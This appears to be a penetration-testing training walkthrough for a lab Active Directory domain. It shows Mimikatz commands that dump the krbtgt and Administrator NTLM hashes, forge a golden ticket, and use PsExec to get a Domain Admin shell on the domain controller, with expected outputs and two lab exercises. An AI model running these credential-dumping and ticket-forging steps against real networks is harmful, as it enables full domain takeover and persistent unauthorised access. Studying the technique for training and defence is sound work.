# Golden Ticket

Failed attempt to perform lateral movement
>``` shell
>C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe
>
># ========== Expected Result ==========
>PsExec v2.4 - Execute processes remotely
>Copyright (C) 2001-2022 Mark Russinovich
>Sysinternals - www.sysinternals.com
>
>Couldn't access DC1:
>Access is denied.
># =====================================
>```

Dumping the krbtgt password hash using Mimikatz
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # lsadump::lsa /patch
>
># ========== Expected Result ==========
>Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
>
>RID  : 000001f4 (500)
>User : Administrator
>LM   :
>NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
>
>RID  : 000001f5 (501)
>User : Guest
>LM   :
>NTLM :
>
>RID  : 000001f6 (502)
>User : krbtgt
>LM   :
>NTLM : 1693c6cefafffc7af11ef34d1c788f47
>...
># =====================================
>```

Purging existing Kerberos Tickets
>``` shell
>mimikatz # kerberos::purge
>
># ========== Expected Result ==========
>Ticket(s) purge for current session is OK
># =====================================
>```

Creating a golden ticket using Mimikatz
>``` shell
>mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
>
># ========== Expected Result ==========
>User      : jen
>Domain    : corp.com (CORP)
>SID       : S-1-5-21-1987370270-658905905-1781884369
>User Id   : 500    
>Groups Id : *513 512 520 518 519
>ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
>Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
>-> Ticket : ** Pass The Ticket **
>
> * PAC generated
> * PAC signed
> * EncTicketPart generated
> * EncTicketPart encrypted
> * KrbCred generated
>
>Golden ticket for 'jen @ corp.com' successfully submitted for current session
># =====================================
>
>mimikatz # misc::cmd
>
># ========== Expected Result ==========
>Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
># =====================================
>```

Using PsExec to access DC01
>``` shell
>C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
>
># ========== Expected Result ==========
>PsExec v2.4 - Execute processes remotely
>Copyright (C) 2001-2022 Mark Russinovich
>Sysinternals - www.sysinternals.com
># =====================================
>
>C:\Windows\system32>ipconfig
>
># ========== Expected Result ==========
>Windows IP Configuration
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . :
>   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
>   IPv4 Address. . . . . . . . . . . : 192.168.50.70
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>
>C:\Windows\system32>whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>```

Performing lateral movement and persistence using the golden ticket and PsExec
>``` shell
>C:\Windows\system32>whoami /groups
>
># ========== Expected Result ==========
>GROUP INFORMATION
>-----------------
>
>Group Name                                  Type             SID                                          Attributes    
>=========================================== ================ ============================================ ===============================================================
>Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
>BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
>BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
>BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
>NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
>NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
>NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
>CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
>CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
>CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
>CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
>CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
>Mandatory Label\High Mandatory Level        Label            S-1-16-12288
># =====================================
>```

Use of NTLM authentication blocks our access
>``` shell
>C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe
>
># ========== Expected Result ==========
>PsExec v2.4 - Execute processes remotely
>Copyright (C) 2001-2022 Mark Russinovich
>Sysinternals - www.sysinternals.com
>
>Couldn't access 192.168.50.70:
>Access is denied.
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. Which user's NTLM hash do we need to abuse in order to forge a golden ticket?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and try to execute the golden ticket persistence technique to get access to DC1 and get the flag located on the administrator's desktop.
>``` shell
>
>```
>
